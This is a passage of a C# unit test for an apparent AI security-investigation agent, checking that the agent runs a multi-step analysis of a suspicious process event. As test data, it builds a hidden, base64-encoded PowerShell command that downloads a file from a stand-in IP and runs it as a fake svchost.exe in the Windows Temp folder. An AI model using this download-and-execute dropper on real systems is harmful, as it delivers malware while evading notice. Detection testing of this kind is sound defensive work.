                Lifecycle = ProcessLifecycle.LifecycleSnapshot
            }
        });

        // 타깃: powershell.exe -w hidden -enc <미등록 IP 198.51.100.99로부터 update.dat를 받아 C:\Windows\Temp\svchost.exe로 저장 및 실행>
        string evasiveScript = "$u='http://198.51.100.99/update.dat'; $p='C:\\Windows\\Temp\\svchost.exe'; (New-Object Net.WebClient).DownloadFile($u, $p); Start-Process $p";
        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(evasiveScript));
        string fullCmd = $"powershell.exe -w hidden -enc {b64}";

        treeManager.ApplyDeltaEvent(new ProcessEvent
        {
            ProcessId = 5002,
            ParentProcessId = 5001,
            ImageName = "powershell.exe",
            CommandLine = fullCmd,
            IsSuspended = true,
            Lifecycle = ProcessLifecycle.LifecycleSuspended
        });

        var targetNode = treeManager.FindActiveNodeByPid(5002);
        Assert.NotNull(targetNode);

        var res = await agent.InvestigateAsync(targetNode, cmd => Task.CompletedTask);

        _output.WriteLine("=========================================================================================");
        _output.WriteLine($"   PHALANX CONVOLUTED EVASION ATTACK INVESTIGATION AUDIT (TURNS: {res.Traces.Count})");
        _output.WriteLine("=========================================================================================");
        _output.WriteLine($"[VERDICT] {res.VerdictAction} (Confidence: {res.Confidence:P0})");
        _output.WriteLine($"[TITLE] {res.SummaryTitle}");
        _output.WriteLine($"[ELAPSED] {res.Elapsed.TotalMilliseconds:F0}ms");
        _output.WriteLine($"[NARRATIVE]\n{res.Narrative}");
        _output.WriteLine("-----------------------------------------------------------------------------------------");
        foreach (var trace in res.Traces)
        {
            _output.WriteLine($"▶ [Turn {trace.StepNumber}] Tool: {trace.ActionTool} | Latency: {trace.ElapsedMs:F0}ms");
            _output.WriteLine($"   Thought: {trace.Thought}");
            _output.WriteLine($"   Observation: {trace.Observation}");
        }

        var audit = new
        {
            Scenario = "Convoluted Evasive Masquerading Attack",
            TotalTurns = res.Traces.Count,
            TotalElapsedMs = res.Elapsed.TotalMilliseconds,
            Verdict = res.VerdictAction.ToString(),
            Confidence = res.Confidence,
            Title = res.SummaryTitle,
            Narrative = res.Narrative,
            MitreTactics = res.MitreTactics,
            Steps = res.Traces.Select(t => new
            {
                Step = t.StepNumber,
                ElapsedMs = t.ElapsedMs,
                Tool = t.ActionTool,
                Thought = t.Thought,
                Observation = t.Observation
            }).ToList()
        };

        string path = Path.Combine(AppContext.BaseDirectory, "convoluted_attack_audit.json");
        File.WriteAllText(path, JsonSerializer.Serialize(audit, new JsonSerializerOptions { WriteIndented = true }));

        // 실측 검증: 미등록 IP 및 위장 드롭 복합 시나리오에서 4턴의 다단계 수사가 전개됨을 검증
        Assert.True(res.Traces.Count >= 4, $"4턴 이상의 복합 수사가 전개되어야 함: 현재 {res.Traces.Count}턴");
    }
}



